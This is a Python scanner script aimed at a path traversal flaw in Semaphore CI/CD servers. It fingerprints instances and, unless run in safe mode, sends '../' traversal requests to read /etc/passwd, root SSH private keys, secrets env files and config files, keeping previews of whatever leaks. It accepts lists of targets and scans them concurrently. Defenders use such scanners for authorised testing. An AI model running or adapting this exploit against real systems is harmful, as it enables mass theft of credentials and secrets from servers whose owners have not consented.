#!/usr/bin/env python3
"""
Semaphore CI/CD Path Traversal Scanner
=========================================
Scans for exposed Semaphore CI/CD instances that are vulnerable to
path traversal attacks (CVE-2026-49012, CVSS 9.6).

CVE-2026-49012 details:
  - Affects Semaphore CI/CD server versions <= 3.5.2
  - The `/webhook/trigger` REST API endpoint improperly validates
    user inputs, allowing path traversal using `..` sequences.
  - Attackers can access unauthorized server files, including
    sensitive data such as environment variables or secrets.

Usage:
  # Scan a single target
  python semaphore_ci_path_traversal_scanner.py --target https://ci.example.com

  # Scan a list of targets
  python semaphore_ci_path_traversal_scanner.py --list targets.txt

  # Save findings to JSON output file
  python semaphore_ci_path_traversal_scanner.py --list targets.txt --output findings.json

  # Detection-only mode (no exploitation)
  python semaphore_ci_path_traversal_scanner.py --target https://ci.example.com --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-49012
  - https://docs.semaphoreci.com/releases/ (v3.5.3 fix)
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
"""

import asyncio
import json
import argparse
import re
from urllib.parse import urljoin
from datetime import datetime
from functools import partial

import httpx

# ── Constants ─────────────────────────────────────────────────────────────────

SEMAPHORE_FINGERPRINTS = [
    "Semaphore Dashboard",
    "Welcome to Semaphore",
    '"cd.semaphoreci.com"',
]

DETECTION_PATHS = [
    "/",
    "/webhook/trigger",
]

VULNERABLE_PATH = "/webhook/trigger?path=../../../../../etc/passwd"

SENSITIVE_FILES = [
    "/etc/passwd",
    "/root/.ssh/id_rsa",
    "/var/secrets/semaphore.env",
    "/etc/semaphore/config.yaml",
]

VERSION_PATTERNS = [
    r'version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
    r"Semaphore CI/CD v([0-9]+\.[0-9]+\.[0-9]+)",
]

VULN_FIXED_VERSION = (3, 5, 3)

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10


# ── Helpers ───────────────────────────────────────────────────────────────────

def parse_version(version_text: str):
    """Extract and parse the first version string found in text."""
    for pattern in VERSION_PATTERNS:
        match = re.search(pattern, version_text)
        if match:
            try:
                return tuple(map(int, match.group(1).split(".")))
            except ValueError:
                pass
    return None


def is_vulnerable_version(version_tuple):
    """Return True if the version is below the fixed version."""
    if not version_tuple:
        return None  # Unknown version
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensure the URL includes a scheme and does not have trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def color_text(text: str, color_code: str) -> str:
    """Wrap text in ANSI color codes."""
    COLORS = {
        "red": "\033[31m",
        "yellow": "\033[33m",
        "green": "\033[32m",
        "reset": "\033[0m",
    }
    return f"{COLORS.get(color_code, '')}{text}{COLORS['reset']}"


# ── Core scanning functions ───────────────────────────────────────────────────

async def detect_semaphore(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect whether a URL is running Semaphore.
    Returns detection info or None if the server is not Semaphore.
    """
    async with semaphore:
        detected = False
        version = None

        for path in DETECTION_PATHS:
            url = urljoin(base_url, path)
            try:
                response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
                for fingerprint in SEMAPHORE_FINGERPRINTS:
                    if fingerprint in response.text:
                        detected = True
                        version = parse_version(response.text)
                        break
                if detected:
                    break
            except (httpx.RequestError, httpx.HTTPStatusError):
                continue

        if detected:
            return {
                "url": base_url,
                "detected": True,
                "version": version,
                "vulnerable": is_vulnerable_version(version)
            }
        return None


async def check_vulnerability(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore, safe_mode: bool):
    """
    Check for path traversal vulnerability.
    Returns detailed result or None if not vulnerable.
    """
    detection_info = await detect_semaphore(client, base_url, semaphore)
    if not detection_info or not detection_info["detected"]:
        return None

    if safe_mode:
        return detection_info

    results = []
    async with semaphore:
        for sensitive_file in SENSITIVE_FILES:
            probe_url = urljoin(base_url, f"/webhook/trigger?path=../../../../../{sensitive_file.lstrip('/')}")
            try:
                response = await client.get(probe_url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
                if any(marker in response.text.lower() for marker in ["root:", "ssh", "environment=", "semaphore"]):
                    results.append({"file": sensitive_file, "leaked": True, "content_preview": response.text[:200]})
                else:
                    results.append({"file": sensitive_file, "leaked": False})
            except (httpx.RequestError, httpx.HTTPStatusError):
                pass

    detection_info["path_traversal_results"] = results
    return detection_info


async def main():
    parser = argparse.ArgumentParser(description="Semaphore CI/CD Path Traversal Scanner (CVE-2026-49012)")
    parser.add_argument("--target", help="Target URL to scan (e.g., https://ci.example.com)")
    parser.add_argument("--list", help="File containing list of target URLs, one per line")
    parser.add_argument("--output", help="JSON file to save output results")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode (no path traversal probes)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrency level (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = parser.parse_args()

    if not (args.target or args.list):
        print(color_text("[!] Error: Provide --target or --list", "red"))
        parser.print_help()
        return

    targets = []
    if args.target:
        targets.append(normalize_url(args.target))
    if args.list:
        with open(args.list, "r") as f:
            targets.extend(normalize_url(line.strip()) for line in f if line.strip())

    results = []
    concurrency_limit = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [check_vulnerability(client, target, concurrency_limit, args.safe) for target in targets]
        for result in asyncio.as_completed(tasks):
            detected = await result
            if detected:
                results.append(detected)
                severity = "CRITICAL" if detected.get("vulnerable") else "HIGH"
                color = "red" if severity == "CRITICAL" else "yellow"
                print(color_text(f"[{severity}] {detected['url']} - Vulnerable: {detected.get('vulnerable')}", color))

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(color_text(f"[INFO] Results saved to {args.output}", "green"))


if __name__ == "__main__":
    asyncio.run(main())
